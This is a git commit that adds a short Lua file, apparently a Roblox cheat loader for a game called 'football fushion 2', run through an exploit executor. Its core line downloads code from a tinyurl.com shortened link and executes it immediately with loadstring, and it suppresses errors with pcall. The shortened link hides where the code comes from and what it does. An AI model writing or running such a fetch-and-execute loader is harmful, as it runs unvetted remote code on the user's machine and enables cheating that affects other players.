fdaeb595b8c478232863541fd3b5483cbb843c87
skq3453 <bluerblx160@gmail.com>
2024-12-03 09:32:48 -0500

    Create uv0ltrhqzoxje9f5qto00gewtec5lku.lua

---
+++ uv0ltrhqzoxje9f5qto00gewtec5lku.lua
@@ -0,0 +1,7 @@
+-- football fushion 2
+if not getgenv().loaded then
+    pcall(function() loadstring(game:HttpGet("https://tinyurl.com/luak4life1"))() end)
+    getgenv().loaded = true
+else
+    print("Already executed!")
+end
